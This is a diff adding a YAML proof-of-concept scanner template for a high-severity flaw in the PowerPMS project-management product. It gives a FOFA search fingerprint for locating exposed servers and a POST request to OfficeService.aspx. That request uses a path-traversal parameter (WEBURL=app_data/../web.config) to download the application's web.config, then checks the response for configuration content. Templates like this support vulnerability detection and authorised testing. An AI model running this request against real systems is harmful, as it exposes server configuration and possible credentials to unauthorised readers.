@@ -1,0 +1,19 @@
+id: poc-yaml-powerpms-download-ssrf
+info:
+  name: 普华 PowerPMS download SSRF漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: powerpms
+  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+requests:
+- method: POST
+  path: /PowerPlat/FormXml/DocFile/OfficeService.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=download&WEBURL=app_data/../web.config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    </system.web>\") &&\ncontains(body,\"PowerControl\") &&\ncontains(headers,\"filename=web.config\"\
+    )\n"
+variables: {}
+transport: http
